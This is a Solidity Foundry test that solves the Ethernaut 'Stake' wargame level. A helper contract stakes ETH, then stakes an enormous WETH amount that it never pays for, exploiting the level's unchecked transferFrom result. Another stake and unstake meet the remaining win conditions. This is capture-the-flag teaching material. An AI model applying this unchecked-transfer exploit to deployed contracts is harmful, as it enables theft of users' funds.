// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level31 {
    function WETH() external returns (address);
    function StakeETH() external payable;
    function StakeWETH(uint256) external returns (bool);
    function Unstake(uint256) external returns (bool);
}

interface Weth {
    function balanceOf(address) external returns (uint256);
    function approve(address, uint256) external;
}

contract BreakLevel31 {
    constructor(Level31 _level31Instance, Weth _weth) payable {
        // Satisfy condition 1
        // This doesn't count as us as we are staking from a new contract
        uint256 minimumAmount = 0.001 ether + 1 wei;
        _level31Instance.StakeETH{value: minimumAmount}();
        // Satisfy condition 2
        uint256 amount = type(uint256).max - minimumAmount;
        _weth.approve(address(_level31Instance), amount);
        // We can then stake the max amount of WETH as the stake WETH function
        // does not revert if the transferFrom fails!!
        _level31Instance.StakeWETH(amount);
    }
}

contract Level31Test is EthernautTest {
    Level31 level31Instance;
    Weth weth;

    function testLevel31() public {
        _createLevel("31");

        level31Instance = Level31(levelInstance["31"]);

        weth = Weth(level31Instance.WETH());

        // To satisfy condition 3 and 4 lets stake and then unstake
        level31Instance.StakeETH{value: 0.001 ether + 1 wei}();
        level31Instance.Unstake(0.001 ether + 1 wei);

        // Satisfy condition 1 and 2 by deploying the BreakLevel31 contract
        new BreakLevel31{value: 0.001 ether + 1 wei}(level31Instance, weth);

        require(_submitLevel("31"));
    }

    receive() external payable {}
}
